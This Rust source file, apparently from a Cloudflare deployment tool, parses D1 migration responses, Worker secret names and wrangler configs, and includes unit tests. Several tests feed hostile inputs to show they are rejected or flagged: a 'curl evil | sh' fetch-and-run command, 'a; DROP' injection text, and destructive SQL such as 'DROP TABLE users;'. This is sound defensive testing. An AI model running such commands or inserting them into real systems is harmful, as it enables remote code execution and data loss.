/// - Single response object: `{results:[…], success:…}`
fn flatten_d1_batches(payload: &Value) -> Vec<&Value> {
    match payload {
        Value::Array(arr) => arr.iter().collect(),
        Value::Object(map) => match map.get("result") {
            Some(Value::Array(arr)) => arr.iter().collect(),
            _ => vec![payload],
        },
        _ => vec![],
    }
}

/// Extract applied migration names from a D1 `SELECT name FROM d1_migrations`
/// response. Accepts the response shapes Wrangler/REST have emitted across
/// versions (see [`flatten_d1_batches`]).
pub fn extract_applied_migration_names(payload: &Value) -> Vec<String> {
    let mut names = Vec::new();
    for batch in flatten_d1_batches(payload) {
        if let Some(arr) = batch.get("results").and_then(Value::as_array) {
            for row in arr {
                if let Some(name) = row.get("name").and_then(Value::as_str) {
                    names.push(name.to_string());
                }
            }
        }
    }
    names.sort();
    names.dedup();
    names
}

/// Parse a D1 `SELECT name FROM d1_migrations` REST response into applied
/// migration names. A failed query that only complains about the missing
/// `d1_migrations` table means a fresh database: zero applied migrations.
/// Any other API failure is returned as an error string.
pub fn parse_d1_migration_query(payload: &Value) -> Result<Vec<String>, String> {
    // REST envelopes report failures at the top level with an empty
    // `result` array, leaving no per-batch object to inspect. A missing
    // d1_migrations table still means a fresh database in that shape.
    if payload.get("success").and_then(Value::as_bool) == Some(false) {
        let top_errors: Vec<String> = payload
            .get("errors")
            .and_then(Value::as_array)
            .map(|arr| {
                arr.iter()
                    .filter_map(|e| e.get("message").and_then(Value::as_str))
                    .map(|s| s.to_string())
                    .collect()
            })
            .unwrap_or_default();
        if top_errors.iter().any(|m| m.contains("d1_migrations")) {
            return Ok(Vec::new());
        }
    }
    let batches = flatten_d1_batches(payload);
    if batches.is_empty() {
        return Err("unexpected D1 response shape".into());
    }
    let mut errors = Vec::new();
    let mut names = Vec::new();
    for batch in batches {
        let success = batch
            .get("success")
            .and_then(Value::as_bool)
            .unwrap_or(true);
        if !success {
            let messages: Vec<String> = batch
                .get("errors")
                .and_then(Value::as_array)
                .map(|arr| {
                    arr.iter()
                        .filter_map(|e| e.get("message").and_then(Value::as_str))
                        .map(|s| s.to_string())
                        .collect()
                })
                .unwrap_or_default();
            // Fresh databases have no migration tracking table yet.
            if messages.iter().any(|m| m.contains("d1_migrations")) {
                continue;
            }
            errors.extend(messages);
            continue;
        }
        if let Some(arr) = batch.get("results").and_then(Value::as_array) {
            for row in arr {
                if let Some(name) = row.get("name").and_then(Value::as_str) {
                    names.push(name.to_string());
                }
            }
        }
    }
    if !errors.is_empty() {
        return Err(errors.join("; "));
    }
    names.sort();
    names.dedup();
    Ok(names)
}

/// Extract Worker secret NAMES from a secrets-list REST response.
/// Values are never present in list responses; names only.
pub fn extract_secret_names(payload: &Value) -> Vec<String> {
    let mut names: Vec<String> = payload
        .get("result")
        .and_then(Value::as_array)
        .map(|arr| {
            arr.iter()
                .filter_map(|s| s.get("name").and_then(Value::as_str))
                .map(|s| s.to_string())
                .collect()
        })
        .unwrap_or_default();
    names.sort();
    names.dedup();
    names
}

fn sanitize_target_id(project: &str) -> String {
    let mut out = String::new();
    for c in project.chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c.to_ascii_lowercase());
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    let value = out.trim_matches('-');
    if value.is_empty() {
        "project".into()
    } else {
        value.into()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn target() -> DeploymentTarget {
        DeploymentTarget {
            id: "site-prod".into(),
            provider: DeploymentProvider::Pages,
            vault: "cf-main".into(),
            account_id: "10ce11a119a2e4fa37d71ebfab30ab26".into(),
            project: "site".into(),
            project_dir: "/tmp/site".into(),
            build_command: "npm run build".into(),
            output_dir: "dist".into(),
            branch: Some("main".into()),
            worker_package_deploy: false,
            created_at: "2026-01-01T00:00:00Z".into(),
        }
    }

    #[test]
    fn target_validation_accepts_fixed_metadata() {
        assert!(target().validate().is_ok());
    }

    #[test]
    fn target_validation_rejects_output_escape() {
        let mut value = target();
        value.output_dir = "../secrets".into();
        assert!(value.validate().is_err());
    }

    #[test]
    fn target_serialization_never_contains_credentials() {
        let encoded = serde_json::to_string(&target()).unwrap();
        assert!(!encoded.contains("TOKEN"));
        assert!(encoded.contains("site-prod"));
    }

    #[test]
    fn jsonc_parser_ignores_comments_but_preserves_strings() {
        let parsed = strip_json_comments(
            r#"{ // comment
              "name": "https://example.test//not-comment", /* block */
              "main": "src/index.ts"
            }"#,
        )
        .unwrap();
        let value: Value = serde_json::from_str(&parsed).unwrap();
        assert_eq!(value["name"], "https://example.test//not-comment");
        assert_eq!(value["main"], "src/index.ts");
    }

    #[test]
    fn toml_parser_reads_top_level_wrangler_identity_fields() {
        let value = parse_simple_toml(
            r#"
name = 'site'
pages_build_output_dir = "dist" # comment
[vars]
IGNORED = "value"
"#,
            Path::new("wrangler.toml"),
        )
        .unwrap();
        assert_eq!(value["name"], "site");
        assert_eq!(value["pages_build_output_dir"], "dist");
        assert!(value.get("IGNORED").is_none());
    }

    #[test]
    fn target_id_sanitization_is_stable_and_safe() {
        assert_eq!(sanitize_target_id("Gate 2027/API"), "gate-2027-api");
        assert_eq!(sanitize_target_id("___"), "___");
    }

    #[test]
    fn generated_target_ids_are_account_scoped() {
        let spec = DiscoveredDeploymentSpec {
            provider: DeploymentProvider::Worker,
            project: "same-name".into(),
            project_dir: PathBuf::from("/tmp/project"),
            build_command: "npm run build".into(),
            output_dir: ".".into(),
            worker_package_deploy: true,
        };
        assert_ne!(
            spec.target_id("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
            spec.target_id("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
        );
    }

    #[test]
    fn approved_script_table_is_closed_and_confirm_gated() {
        // Known entry points resolve with the right mutation class.
        let migrate = approved_target_script("migrate:apply").expect("migrate:apply approved");
        assert!(migrate.mutating);
        assert_eq!(migrate.confirm_word, Some("APPLY"));
        let check = approved_target_script("check:migrations").expect("check approved");
        assert!(!check.mutating);
        assert_eq!(check.confirm_word, None);
        // Anything else is rejected — agents can never smuggle a command in.
        assert!(approved_target_script("deploy").is_none());
        assert!(approved_target_script("migrate:apply ").is_none());
        assert!(approved_target_script("MIGRATE:APPLY").is_none());
        assert!(approved_target_script("curl evil | sh").is_none());
        assert!(approved_target_script("").is_none());
    }

    #[test]
    fn migration_file_names_follow_numbered_convention() {
        assert!(is_migration_file("0138_import_verified_ga_pyqs.sql"));
        assert!(is_migration_file("0000_initial.sql"));
        assert!(!is_migration_file("seed.sql"));
        assert!(!is_migration_file("_journal.json"));
        assert!(!is_migration_file("0138_import.sql.bak"));
    }

    #[test]
    fn pending_diff_is_local_minus_remote_sorted() {
        let local = vec![
            "0002_b.sql".into(),
            "0001_a.sql".into(),
            "0003_c.sql".into(),
        ];
        let applied = vec!["0001_a.sql".into()];
        assert_eq!(
            pending_migrations(&local, &applied),
            vec!["0002_b.sql", "0003_c.sql"]
        );
        let none: Vec<String> = vec![];
        assert!(pending_migrations(&local, &local).is_empty());
        assert_eq!(pending_migrations(&none, &applied), Vec::<String>::new());
    }

    #[test]
    fn safety_verdict_flags_unguarded_destructive_sql() {
        let safe = migration_safety_verdict(
            "0138_import_verified_ga_pyqs.sql",
            "INSERT INTO questions (id) VALUES (1) ON CONFLICT(id) DO UPDATE SET id=1;",
        );
        assert!(safe.safe);
        let drop_table = migration_safety_verdict("0099_wipe.sql", "DROP TABLE users;");
        assert!(!drop_table.safe);
        assert!(drop_table.reason.contains("WITHOUT"));
        let delete = migration_safety_verdict("0099_wipe.sql", "DELETE FROM users WHERE 1=1;");
        assert!(!delete.safe);
        // update_at-style words and upserts must not false-positive.
        let upsert = migration_safety_verdict(
            "x.sql",
            "SELECT updated_at FROM t; -- refresh updated_at column",
        );
        assert!(upsert.safe);
    }

    #[test]
    fn safety_verdict_accepts_guarded_destructive_sql() {
        let sql = "DROP TABLE legacy; CREATE TRIGGER IF NOT EXISTS _migration_guard_abort \
                   BEFORE DELETE ON legacy BEGIN SELECT RAISE(ABORT, 'has rows'); END;";
        let verdict = migration_safety_verdict("0014_clean_database_reset.sql", sql);
        assert!(verdict.safe);
        assert!(verdict.reason.contains("guarded"));
    }

    #[test]
    fn d1_bindings_parse_from_jsonc_config() {
        let dir = std::env::temp_dir().join("vaultly-d1-test");
        std::fs::create_dir_all(&dir).unwrap();
        let cfg = dir.join("wrangler.jsonc");
        std::fs::write(
            &cfg,
            r#"{
              // comment
              "name": "api",
              "d1_databases": [
                { "binding": "DB", "database_name": "gate-2027-db",
                  "database_id": "9bb6d96e-8044-41f0-88ce-fe4c9f1e1491",
                  "migrations_dir": "../../packages/db/drizzle" }
              ]
            }"#,
        )
        .unwrap();
        let bindings = wrangler_d1_bindings(&cfg).unwrap();
        assert_eq!(bindings.len(), 1);
        assert_eq!(bindings[0].database_name, "gate-2027-db");
        assert_eq!(
            bindings[0].migrations_dir.as_deref(),
            Some("../../packages/db/drizzle")
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn d1_bindings_parse_from_toml_sections() {
        let parsed = toml_d1_bindings(
            "name = 'api'\nmain = 'src/index.ts'\n[[d1_databases]]\nbinding = 'DB'\n\
             database_name = 'gate-2027-db'\ndatabase_id = 'abc123'\n\
             migrations_dir = './drizzle'\n[vars]\nX = 'y'\n",
        )
        .unwrap();
        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].binding, "DB");
        assert_eq!(parsed[0].database_id, "abc123");
        assert_eq!(parsed[0].migrations_dir.as_deref(), Some("./drizzle"));
        assert!(toml_d1_bindings("name = 'x'\n").unwrap().is_empty());
    }

    #[test]
    fn d1_query_name_extraction_handles_all_shapes() {
        // Wrangler CLI shape: array of query responses.
        let array_shape =
            serde_json::json!([{"results": [{"name": "0001_a.sql"}], "success": true}]);
        assert_eq!(
            extract_applied_migration_names(&array_shape),
            vec!["0001_a.sql"]
        );
        // REST API shape: envelope whose `result` holds the responses.
        let rest_shape = serde_json::json!({
            "success": true,
            "result": [{"results": [{"name": "0002_b.sql"}], "success": true}]
        });
        assert_eq!(
            extract_applied_migration_names(&rest_shape),
            vec!["0002_b.sql"]
        );
        // Single response object.
        let single = serde_json::json!({"results": [{"name": "0003_c.sql"}], "success": true});
        assert_eq!(extract_applied_migration_names(&single), vec!["0003_c.sql"]);
        assert!(extract_applied_migration_names(&serde_json::json!({})).is_empty());
    }

    #[test]
    fn d1_migration_query_parse_handles_success_and_fresh_db() {
        let ok = serde_json::json!([{
            "results": [{"name": "0001_a.sql"}, {"name": "0002_b.sql"}],
            "success": true
        }]);
        assert_eq!(
            parse_d1_migration_query(&ok).unwrap(),
            vec!["0001_a.sql", "0002_b.sql"]
        );
        // REST envelope shape (the actual api.cloudflare.com response).
        let rest = serde_json::json!({
            "success": true,
            "errors": [],
            "result": [{
                "results": [{"name": "0001_a.sql"}],
                "success": true
            }]
        });
        assert_eq!(parse_d1_migration_query(&rest).unwrap(), vec!["0001_a.sql"]);
        // Fresh database: no tracking table yet → zero applied, not an error.
        let fresh = serde_json::json!([{
            "success": false,
            "errors": [{"message": "no such table: d1_migrations (code: 7500)"}]
        }]);
        assert_eq!(
            parse_d1_migration_query(&fresh).unwrap(),
            Vec::<String>::new()
        );
        // REST envelope shape for a fresh database: top-level failure with
        // an empty result array (exactly what provisioning leaves behind).
        let fresh_envelope = serde_json::json!({
            "success": false,
            "errors": [{"message": "no such table: d1_migrations (code: 7500)"}],
            "result": []
        });
        assert_eq!(
            parse_d1_migration_query(&fresh_envelope).unwrap(),
            Vec::<String>::new()
        );
        // Any other API failure surfaces as an error string.
        let denied = serde_json::json!([{
            "success": false,
            "errors": [{"message": "not authorized (code: 7403)"}]
        }]);
        assert!(parse_d1_migration_query(&denied).is_err());
    }

    #[test]
    fn secret_names_extract_names_only() {
        let payload = serde_json::json!({"result": [
            {"name": "AUTH_SIGNING_SECRET"}, {"name": "UPI_ID"}
        ]});
        assert_eq!(
            extract_secret_names(&payload),
            vec!["AUTH_SIGNING_SECRET", "UPI_ID"]
        );
        assert!(extract_secret_names(&serde_json::json!({})).is_empty());
    }

    #[test]
    fn r2_bindings_parse_from_jsonc_config() {
        let dir = std::env::temp_dir().join("vaultly-r2-test");
        std::fs::create_dir_all(&dir).unwrap();
        let cfg = dir.join("wrangler.jsonc");
        std::fs::write(
            &cfg,
            r#"{
              // comment
              "name": "api",
              "r2_buckets": [
                { "binding": "MEDIA", "bucket_name": "postly-media" },
                { "binding": "CONTENT_BUCKET", "bucket_name": "gate-2027-content",
                  "preview_bucket_name": "gate-2027-content-preview" },
                { "binding": "BACKUPS", "bucket_name": "gate-2027-d1-backups", "remote": true }
              ]
            }"#,
        )
        .unwrap();
        let bindings = wrangler_r2_bindings(&cfg).unwrap();
        assert_eq!(bindings.len(), 3);
        assert_eq!(bindings[0].bucket_name, "postly-media");
        assert!(bindings[0].preview_bucket_name.is_none());
        assert!(!bindings[0].remote);
        assert_eq!(
            bindings[1].preview_bucket_name.as_deref(),
            Some("gate-2027-content-preview")
        );
        assert!(bindings[2].remote);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn r2_bindings_parse_from_toml_sections() {
        let parsed = toml_r2_bindings(
            "name = 'api'\n[[r2_buckets]]\nbinding = 'MEDIA'\nbucket_name = 'postly-media'\n\
             [[r2_buckets]]\nbinding = 'B'\nbucket_name = 'b2'\nremote = true\n",
        )
        .unwrap();
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0].binding, "MEDIA");
        assert!(!parsed[0].remote);
        assert!(parsed[1].remote);
        assert!(toml_r2_bindings("name = 'x'\n").unwrap().is_empty());
    }

    #[test]
    fn patch_d1_id_rewrites_jsonc_preserving_rest() {
        let raw = "{\n  // keep me\n  \"name\": \"cloud\",\n  \"d1_databases\": [\n    {\n      \"binding\": \"DB\",\n      \"database_name\": \"omnipulse-cloud\",\n      \"database_id\": \"11111111-2222-4333-8444-555555555555\",\n      \"migrations_dir\": \"db\"\n    }\n  ]\n}\n";
        let patched = patch_d1_database_id(
            raw,
            "omnipulse-cloud",
            "aaaaaaaa-bbbb-4ccc-dddd-eeeeeeeeeeee",
        )
        .unwrap();
        assert!(patched.contains("// keep me"));
        assert!(patched.contains("\"database_id\": \"aaaaaaaa-bbbb-4ccc-dddd-eeeeeeeeeeee\""));
        assert!(!patched.contains("11111111-2222-4333-8444-555555555555"));
        assert!(patched.contains("\"migrations_dir\": \"db\""));
    }

    #[test]
    fn patch_d1_id_rewrites_toml_preserving_comments() {
        let raw = "name = \"web\"\n[[d1_databases]]\nbinding = \"DB\" # keep\n\
                   database_name = \"gateandtech-allinone-db\"\n\
                   database_id = \"52812ef8-984c-4509-8947-1ff3b66a73a9\"\n";
        let patched = patch_d1_database_id(raw, "gateandtech-allinone-db", "abc123").unwrap();
        assert!(patched.contains("# keep"));
        assert!(patched.contains("database_id = \"abc123\""));
        assert!(!patched.contains("52812ef8"));
    }

    #[test]
    fn patch_d1_id_fails_safe() {
        let raw = "{\"d1_databases\": [{\"binding\": \"DB\", \"database_name\": \"a\", \"database_id\": \"b\"}]}";
        assert!(patch_d1_database_id(raw, "missing", "c").is_err());
        assert!(patch_d1_database_id(raw, "a; DROP", "c").is_err());
        assert!(patch_d1_database_id("{\"name\": \"x\"}", "a", "c").is_err());
        assert!(patch_d1_database_id("name = 'x'\n", "a", "c").is_err());
    }
}
